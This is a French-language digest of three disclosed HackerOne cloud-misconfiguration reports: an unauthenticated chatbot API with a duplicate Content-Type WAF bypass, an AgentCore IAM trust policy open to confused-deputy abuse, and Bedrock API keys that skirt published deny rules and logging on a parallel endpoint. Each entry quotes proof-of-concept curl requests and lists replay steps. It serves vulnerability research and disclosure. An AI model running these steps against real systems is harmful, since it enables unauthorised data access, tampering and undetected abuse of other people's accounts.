# Fiches SSS — Cloud Misconfig — AWS / GCP / Azure

*3 cas sélectionnés dans le corpus 2025-2026. Preuves verbatim extraites des fichiers bruts `tools/collector/data/raw/h1/<id>.json` (texte intégral HackerOne).*

---

### Unauthenticated API allows reading, writing to and deleting any user's private chat history

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/4020767)

`████████` héberge un chatbot Microsoft Teams interne adossé à un RAG (Azure OpenAI). L'application expose en parallèle une API HTTP dont les routes de données sont sans authentification : un attaquant non authentifié liste toutes les conversations, lit l'historique de n'importe laquelle, y écrit et la supprime. Les `session_id` sont les identifiants utilisateur Teams (`teams_29:<opaque-id>`), donc chaque conversation est attribuable. La même API est exposée en développement.

**Cause racine :** aucune authentification sur les routes de données (seul le webhook Teams est protégé) ; le seul contrôle du chemin d'écriture, une règle WAF bloquant la clé `session_id`, est contourné par deux en-têtes `Content-Type` : le WAF évalue le dernier (`text/plain`, il saute l'inspection JSON), FastAPI le premier (`application/json`, il parse le corps).

**Preuve technique (verbatim depuis la source) :**

```
| route | methods | authentication |
|---|---|---|
…
| `/api/sessions` | GET | none |
| `/api/sessions/{session_id}` | DELETE | none |
| `/api/sessions/{session_id}/history` | GET | none |
| `/api/chat` | POST | WAF rule only — bypassed below |
| `/api/feedback` | POST | none |
| `/api/health` | GET | none |

curl -sk -X POST \
  -H 'Content-Type: application/json' -H 'Content-Type: text/plain' \
  --data-binary "{\"message\":\"Hello, how are you?\",\"session_id\":\"$SID\"}" \
  "$H/api/chat"

curl -sk "$H/api/sessions/$SID/history"
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : accès réseau à l'API (production ou développement) ; aucun identifiant, cookie ou jeton (toutes les requêtes du PoC sont non authentifiées).
- Étapes : 1. `GET /api/sessions` liste les conversations et fournit les `session_id` cibles. 2. `GET /api/sessions/{id}/history` renvoie l'historique complet. 3. `POST /api/chat` avec `application/json` puis `text/plain` en `Content-Type` et un corps `{"message":…,"session_id":…}` écrit dans la conversation choisie. 4. `DELETE /api/sessions/{id}` la retire du listing, mais `GET …/history` continue de renvoyer les messages (suppression incomplète).
- Pièges / limites : 403 si un seul en-tête `Content-Type: application/json` ou si l'ordre est inversé (deux contrôles). Identifiant inexistant → `200` et tableau vide. Hôtes masqués (`████████`) ; les messages « supprimés » ne disparaissent qu'avec un accès base de données.

**Reproductibilité :** moyenne — chaîne complète et déterministe sans compte requis, mais l'hôte cible est masqué dans la source.

**Techniques :** unauthenticated api access, broken access control, duplicate content-type header confusion, waf bypass, idor via session identifier, incomplete deletion

**Correspond aux classes qualifiantes :** idor, information disclosure, waf bypass, integrity tampering

**Signal (endpoints/fonctions observés) :**
- `GET /api/sessions`
- `GET /api/sessions/{session_id}/history`
- `POST /api/chat`
- `DELETE /api/sessions/{session_id}`

**Paramètres impliqués :** `session_id`, `message`, `Content-Type`

---

### Bedrock AgentCore Starter Toolkit Creates Gateway IAM Roles Without Confused Deputy Protections

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3632577)

La CLI du Bedrock AgentCore Starter Toolkit (`agentcore gateway create`) crée des rôles IAM pour l'AgentCore Gateway avec des trust policies dépourvues des conditions `aws:SourceArn` / `aws:SourceAccount` : n'importe quelle charge AgentCore, dans n'importe quel compte AWS, peut assumer le rôle du Gateway d'une victime (confused deputy). Le rôle accorde `secretsmanager:GetSecretValue` sur `*`, `lambda:InvokeFunction` sur toutes les fonctions, `kms:*`, `AmazonDynamoDBFullAccess` et `AmazonS3ReadOnlyAccess`. La Console AWS ajoute les conditions ; seul le chemin CLI/IaC est touché.

**Cause racine :** le modèle de trust policy du Gateway (`constants.py`) omet les conditions de source, alors que le template Jinja2 des rôles d'exécution et la Console les incluent — l'intention de sécurité existe mais n'est pas appliquée de façon cohérente. Le même défaut se répète dans les templates CDK et Terraform.

**Preuve technique (verbatim depuis la source) :**

```
BEDROCK_AGENTCORE_TRUST_POLICY = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {"Service": "bedrock-agentcore.amazonaws.com"},
            "Action": "sts:AssumeRole",
        }
    ],
}

No `Condition` block. Compare with the Jinja2 template which correctly includes:

- `secretsmanager:GetSecretValue` on `*` (every secret in the account)
- `lambda:InvokeFunction` on `arn:aws:lambda:*:*:function:*` (every Lambda)
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : un compte AWS attaquant avec accès AgentCore ; connaître l'ARN du rôle Gateway de la victime (motif de nommage prévisible selon la source) ; pour la vérification, un compte permettant de créer un Gateway.
- Étapes : 1. `pip install bedrock-agentcore-starter-toolkit` puis `agentcore gateway create --name my-gateway`. 2. `aws iam get-role --role-name <gateway-role-name> --query 'Role.AssumeRolePolicyDocument'` : observer l'absence de bloc `Condition`. 3. Depuis un autre compte AWS avec accès AgentCore, configurer un target de Gateway avec l'ARN du rôle victime : AgentCore assume le rôle de la victime pour l'attaquant.
- Pièges / limites : le chemin Console n'est pas vulnérable ; la correction recommandée ajoute les conditions (paramétrées) et scope `secretsmanager`/`kms` ; l'exploitation suppose de connaître l'ARN du rôle cible.

**Reproductibilité :** moyenne — exige deux comptes AWS avec accès AgentCore et l'ARN du rôle cible (motif prévisible).

**Techniques :** confused deputy, missing source arn condition, iac template misconfiguration, cross-account role assumption, over-privileged role

**Correspond aux classes qualifiantes :** cloud iam misconfiguration, confused deputy, privilege escalation

**Signal (endpoints/fonctions observés) :**
- `agentcore gateway create`
- `BEDROCK_AGENTCORE_TRUST_POLICY`
- Principal `bedrock-agentcore.amazonaws.com` + `sts:AssumeRole` sans `Condition`
- Templates `agentcore-stack.ts.j2` et `bedrock_agentcore.tf.j2`

**Paramètres impliqués :** `aws:SourceArn`, `aws:SourceAccount`

---

### bedrock-mantle.api.aws accepts Bedrock API keys outside AWS-published defenses

**📄 Cas réel**
sévérité : medium · [source](https://hackerone.com/reports/3702072)

Les clés API Bedrock (`ABSK*` long terme, `bedrock-api-key-*` court terme) s'authentifient contre `bedrock-mantle.{region}.api.aws`, un second plan d'inférence joint dans 7+ régions, compatible OpenAI (`/v1/models`, `/v1/chat/completions`), avec 38 des 39 modèles facturables. Trois défenses clientes ne le couvrent pas : le `Deny` SCP/IAM publié ne matche pas le préfixe `bedrock-mantle`, le filtre CloudTrail publié ne matche pas le chemin JSON des événements mantle, et la journalisation d'invocation ne capture pas les prompts mantle (aucune API cliente équivalente). Une clé compromise consomme ainsi de l'inférence facturable invisible pour les contrôles recommandés.

**Cause racine :** un second plan de service acceptant les mêmes clés API a été ajouté sans couverture par les contrôles clients : nom d'action IAM, chemin de champ CloudTrail et journalisation des prompts diffèrent du plan `bedrock` documenté.

**Preuve technique (verbatim depuis la source) :**

```
$ curl -sS -H "Authorization: Bearer $ABSK" https://bedrock-mantle.us-east-1.api.aws/v1/models | jq '.data | length'
39

$ aws iam put-user-policy --user-name ████████ --policy-name VDPDenyBedrockBearer \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Deny","Action":"bedrock:CallWithBearerToken","Resource":"*"}]}'

$ curl -sS -o /dev/null -w "bedrock std: %{http_code}\n" -H "Authorization: Bearer $ABSK" https://bedrock.us-east-1.amazonaws.com/foundation-models
bedrock std: 403                                                          # explicit deny matches
$ curl -sS -o /dev/null -w "mantle:      %{http_code}\n" -H "Authorization: Bearer $ABSK" https://bedrock-mantle.us-east-1.api.aws/v1/models
mantle:      200                                                          # bypass
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte AWS avec Bedrock et un modèle approuvé ; clé API long terme `ABSK` générée en console (utilisateur fantôme `BedrockAPIKey-<4-char-id>` avec `AmazonBedrockLimitedAccess`) ; permissions IAM `PutUserPolicy`/`DeleteUserPolicy` sur cet utilisateur ; pour le forensique, un trail CloudTrail et une journalisation d'invocation vers S3.
- Étapes : 1. `curl -H "Authorization: Bearer $ABSK" https://bedrock-mantle.us-east-1.api.aws/v1/models` → 200, 39 modèles ; sans jeton ou jeton bidon → 401. 2. Poser le `Deny: bedrock:CallWithBearerToken` : plan standard 403, mantle 200 ; avec `bedrock-mantle:CallWithBearerToken`, mantle renvoie bien 403. 3. CloudTrail : `requestParameters.callWithBearerToken` présent, `additionalEventData` absent. 4. Test à marqueur apparié : le prompt envoyé via mantle n'apparaît pas dans les `BedrockModelInvocationLogs`.
- Pièges / limites : CloudTrail exige des data events avec `AWS::BedrockMantle::Project` ; l'absence de journalisation mantle n'est pas corrigeable côté client (« requires an AWS-side change ») ; le sous-commandement `bedrock-mantle` n'existe pas ; `anthropic.claude-opus-4-7` est listé mais non invocable (38/39 facturables).

**Reproductibilité :** moyenne — nécessite un compte AWS, une clé API Bedrock valide et des configurations CloudTrail/logging pour les contrôles annexes.

**Techniques :** parallel service plane, iam action prefix mismatch, cloudtrail field path mismatch, logging gap, api key abuse, undocumented service plane

**Correspond aux classes qualifiantes :** cloud misconfig, detection bypass, defense evasion, api key abuse

**Signal (endpoints/fonctions observés) :**
- `https://bedrock-mantle.{region}.api.aws/v1/models`
- `POST /v1/chat/completions`
- `bedrock-mantle:CallWithBearerToken`
- `requestParameters.callWithBearerToken`

**Paramètres impliqués :** en-tête `Authorization: Bearer <ABSK|bedrock-api-key-*>`
